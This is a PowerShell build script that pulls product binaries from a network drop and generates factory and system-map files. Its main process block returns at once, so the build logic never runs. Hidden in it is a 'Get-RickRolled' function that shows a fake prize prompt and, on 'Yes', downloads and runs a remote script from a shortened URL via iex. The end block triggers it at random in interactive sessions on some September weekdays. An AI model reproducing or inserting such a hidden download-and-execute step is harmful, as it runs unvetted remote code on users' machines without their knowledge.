##
# For each module in the product manifest we gets all built <ModuleName>\Bin\Module from the $dropRoot and puts
# it into the $binariesDirectory. The factory .bin will be created from what exists in the $binariesDirectory
#
# Flag $getDebugFiles will get all pdb's so that you can debug
##
<# 
.Synopsis 
    Pull from the drop location all source and assocated tests of those modules that are defined in the given product manifest  
.Description    
    For each module in the product manifest we get the built ouput from <ModuleName>\Bin\Test and <ModuleName>\Bin\Module 
    and puts it into the $binariesDirectory. 
    The factory .bin will be created from what exists in the $binariesDirectory
.Example     
    GetProduct -$productManifestPath C:\Source\Dev\<branch name>\ExpertManifest.xml -$dropRoot \\na.aderant.com\expertsuite\dev\<branch name> -$binariesDirectory C:\Source\Dev\<branch name>\Binaries
    GetProduct -$productManifestPath C:\Source\Dev\<branch name>\ExpertManifest.xml -$dropRoot \\na.aderant.com\expertsuite\dev\<branch name> -$binariesDirectory C:\Source\Dev\<branch name>\Binaries -$getDebugFiles $true
.Parameter productManifestPath
    The path to the product manifest that defines the modules that makeup the product
.Parameter dropRoot
    The path drop location that the binaries will be fetched from
.Parameter binariesDirectory
    The directory you want the binaries to be copied too
.Parameter systemMapConnectionString
    For the creation of customization in the format of /pdbs:<server> /pdbd:<expertdatabase> /pdbid:<userid> /pdbpw:<userpassword>
.Parameter onlyUpdated
    Only gets the modules that have changed since the last get-product
.Parameter pullRequestId
    The pull request build that should be mixed into the product
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory,
    [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$dropRoot,
    [Parameter(Mandatory=$false)][ValidateNotNullOrEmpty()][string]$branch,
    [Parameter(Mandatory=$false)][int]$pullRequestId,
    [switch]$acquireTestAssemblies,
    [switch]$buildServerImage
)

begin {
    $ErrorActionPreference = "Stop"
    Write-Host $MyInvocation.MyCommand.Name

    . "$PSScriptRoot\..\Build\Build-Libraries.ps1"

    Set-StrictMode -Version Latest

    function Clear-Environment {
        param (
            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory
        )

        process {
            if (Test-Path $binariesDirectory) {                
                Remove-Item $binariesDirectory\* -Recurse -Force -Exclude "environment.xml", "cms.ini"
            }
        
            $script:LogDirectory = [System.IO.Path]::Combine($binariesDirectory, "Logs")
            New-Item -Path ($script:LogDirectory) -ItemType Directory -ErrorAction SilentlyContinue | Out-Null
        
            [string]$expertSourceDirectory = Join-Path -Path $binariesDirectory -ChildPath "ExpertSource"
            New-Item -ItemType Directory -Path $expertSourceDirectory | Out-Null
        }
    }

    <#
        Generate the customization sitemap
    #>
    function New-Factory() {
        param (
            [string]$inDirectory,
            [string]$searchPath
        )

        process {
            Write-Host "Generating factory in [$inDirectory]"

            return Start-Job -Name "Generate Factory" -ScriptBlock { 
                param([string]$directory, [string]$searchPath, [string]$logDirectory)

                (& $directory\FactoryResourceGenerator.exe /v:+ /f:$directory /of:$directory/Factory.bin $searchPath > "$logDirectory\FactoryResourceGenerator.log") | Out-Null

                if (Test-Path -Path "$directory\FactoryResourceGenerator.log") {
                    Remove-Item -Path "$directory\FactoryResourceGenerator.log" -Force | Out-Null # Remove log file from the source directory.
                }
            } -Argument $inDirectory, $searchPath, $script:LogDirectory
        }
    }

    <#
        Generate the customization sitemap
    #>
    function GenerateSystemMap() {
        param (
            [string]$inDirectory,
            [string]$systemMapArgs
        )

        process {
            Write-Host "About to generate the system map"
        
            if ($systemMapArgs -like "*/pdbs*" -and $systemMapArgs -like "*/pdbd*" -and $systemMapArgs -like "*/pdbid*" -and $systemMapArgs -like "*/pdbpw*") {
                return Start-Job -Name "Generate System Map" -ScriptBlock {
                    param($directory, $systemMapArgs, $logDirectory) 

                    $connectionParts = $systemMapArgs.Split(" ")
                    Write-Host "System Map builder arguments are [$connectionParts]"

                    & $directory\SystemMapBuilder.exe /f:$directory /o:$directory\systemmap.xml /ef:Customization $connectionParts[0] $connectionParts[1] $connectionParts[2] $connectionParts[3] > "$logDirectory\SystemMap.log"
                } -Argument $inDirectory, $systemMapArgs, $script:LogDirectory
            
            } else {
                throw "Connection string is invalid for use with SystemMapBuilder.exe [$systemMapArgs]"
            }
        }
    }

    <#
        Write license attribution content (license.txt) to the product directory
    #>
    function New-ThirdPartyAttributionFile([string[]]$licenseText, [string]$expertSourceDirectory) {
        Write-Output "Generating ThirdParty license file."
        $attributionFile = Join-Path $expertSourceDirectory 'ThirdPartyLicenses.txt'        
        foreach ($license in $licenseText) {
            Add-Content -Path $attributionFile -Value $license -Encoding UTF8
        }
        if (-not (Test-Path $attributionFile)) {
            throw "Third Party license file not generated"
        }
        Write-Output "Attribution file: $attributionFile"
    }

    function Get-Modules() {
        [CmdletBinding()]
        param([string]$productManifestPath, $modules, [string[]]$folders, [string]$expertSourceDirectory, [string]$teamProject, [string]$tfvcBranchName, [string]$tfvcSourceGetVersion, [string]$buildUri, [string]$tfsBuildNumber) 

        [string[]]$modules = $modules | Select-Object -ExpandProperty Name

        # only do this for a CI build
        if ($teamProject -and $tfvcBranchName -and $tfvcSourceGetVersion) {

            Write-Output "Team project: $teamProject"
            Write-Output "TFVC branch: $tfvcBranchName"
            Write-Output "Associated TFVC changeset: $tfvcSourceGetVersion"
        }

        $splitBuildUri = $buildUri.Split('/')
        $tfsBuildId = $splitBuildUri[$splitBuildUri.Length - 1]

        Write-Output "-Modules $modules -Folders $folders -ProductDirectory $expertSourceDirectory -TfvcSourceGetVersion $tfvcSourceGetVersion -TeamProject $teamProject -TfvcBranch $tfvcBranchName -TfsBuildId $tfsBuildId -TfsBuildNumber $tfsBuildNumber"
        $result = Package-ExpertRelease -ProductManifestPath $productManifestPath -Modules $modules -Folders $folders -ProductDirectory $expertSourceDirectory -TfvcSourceGetVersion $tfvcSourceGetVersion -TeamProject $teamProject -TfvcBranch $tfvcBranchName -TfsBuildId $tfsBuildId -TfsBuildNumber $tfsBuildNumber
        if ($result) {
            New-ThirdPartyAttributionFile $result.ThirdPartyLicenses $expertSourceDirectory
        }
    }  
    
    function WaitForJobs() {
        while ((Get-Job).State -match "Running") {
            $jobs = Get-Job | Where-Object {$_.HasMoreData}

            if ($jobs) {
                $message = [string]::Join(", ", ($jobs | Select-Object -ExpandProperty "Name"))
                Write-Host "Waiting for job(s): $message..."
            }

            foreach ($job in $jobs) {
                Receive-Job $job -ErrorAction SilentlyContinue # Log4net throws exceptions when the output of the FactoryResourceGenerator is redirected.
            }
                
            Start-Sleep -Seconds 5
        }        
    }

    <#
        Builds the Expert server image
    #>
    function New-ServerImage {
        [string]$deploymentEngine = Join-Path -Path $binariesDirectory -ChildPath "DeploymentEngine.exe"
        [string]$serverImageDirectory = Join-Path -Path $binariesDirectory -ChildPath "ExpertServerImage"
        [string]$parameters = "CreateServerImage /source:'$expertSourceDirectory' /image:'$serverImageDirectory\Bin\Module' /name:ExpertServerImage /skh"

        # Copy dependencies required to run DeploymentEngine
        [string[]]$dependencies = @(
            "$expertSourceDirectory\Aderant.Framework.dll",
            "$expertSourceDirectory\Aderant.Framework.Deployment.dll",
            "$expertSourceDirectory\log4net.dll"
            "$expertSourceDirectory\System.Reactive.dll",
            "$expertSourceDirectory\System.Reactive.Providers.dll",
            "$expertSourceDirectory\System.Reactive.Windows.Threading.dll",
            "$expertSourceDirectory\ICSharpCode.SharpZipLib.dll"
            )

        Copy-Item -Path $dependencies -Destination $binariesDirectory

        Write-Host $parameters

        # Run Deployment Engine
        $sb = [scriptblock]::Create("$deploymentEngine $parameters")
        & $sb | Write-Host

        if ($LASTEXITCODE -ne 0) {
            throw "Failed to create server image successfully."
        }

        # Copy the Expert Server Image to the drop
        & "$PSScriptRoot\..\Build\CopyToDrop.ps1" -moduleName "ExpertApplicationServer" -moduleRootPath $serverImageDirectory -dropRootUNCPath "\\dfs.aderant.com\ExpertSuite\$tfvcBranchName\ExpertApplicationServer\1.8.0.0" -assemblyFileVersion $($tfsBuildNumber).Split('_')[1]

        # Fix folder paths in the Expert Binaries
        Move-Item -Path "$serverImageDirectory\Bin\Module\*" -Destination $serverImageDirectory
        Get-ChildItem "$serverImageDirectory\Bin" -Recurse -Force | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "$serverImageDirectory\Bin" -Recurse -Force -ErrorAction SilentlyContinue 
    }
    
    function Validate-Product {
        param (
            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory,
            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$sourceDirectory
        )

        if (Test-Path "$binariesDirectory\Test\DeploymentCheck\DeploymentCheck.exe") {
            & "$binariesDirectory\Test\DeploymentCheck\DeploymentCheck.exe" ValidateRoleManifests $sourceDirectory

            if ($LASTEXITCODE -ne 0) {
                Write-Error "Role manifest validation failed. See above lines for details."
                exit 1
            }
        }
    }

    function Get-RickRolled {
        begin {
            [string]$title = "Claim prize?"
            [string]$message = "You have won a prize!!! Do you want to claim it?"
        }

        process {
            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes"
            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No"
        
            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
            switch ($result) {
                0 {Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')' }                              
            }
        }
    }
}


process {
    return

    if (-not (Test-Path $productManifestPath)) {
        Write-Error -Message "Product manifest not found at path: $productManifestPath"
        exit 1
    }

    Clear-Environment -binariesDirectory $binariesDirectory



}

end {
    if ([System.Environment]::UserInteractive -and $host.Name -eq "ConsoleHost") {
        $psInteractive = (-not [System.Environment]::GetCommandLineArgs() -Contains '-NonInteractive')

        if ($psInteractive -and (Get-Random -Maximum 2 -Minimum 0) -eq 1) {
            if ([System.DateTime]::Now.Month -eq 9 -and ([System.DateTime]::Now.DayOfWeek -in [System.DayOfWeek]::Monday,[System.DayOfWeek]::Tuesday,[System.DayOfWeek]::Wednesday)) {
                Get-RickRolled
            }      
        }
    }

    exit $LASTEXITCODE
}